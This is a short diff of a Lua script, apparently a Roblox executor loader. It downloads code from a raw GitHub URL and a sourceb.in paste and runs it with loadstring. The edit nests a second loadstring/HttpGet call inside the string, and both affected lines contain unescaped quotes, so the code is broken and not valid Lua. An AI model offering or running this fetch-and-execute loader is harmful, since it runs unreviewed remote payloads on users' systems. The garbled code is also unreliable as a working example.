@@ -1,4 +1,4 @@
 local s1 = game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagDspawner/RayfieldSpawner/refs/heads/main/DarkSpawner/x/NoLagV2/Loader.lua"))()")
-local s2 = game:HttpGet("https://cdn.sourceb.in/bins/LKxMtxu9PS/0")
+local s2 = game:HttpGet("loadstring(game:HttpGet("https://cdn.sourceb.in/bins/LKxMtxu9PS/0", true))()")
 loadstring(s1)()
 loadstring(s2)()
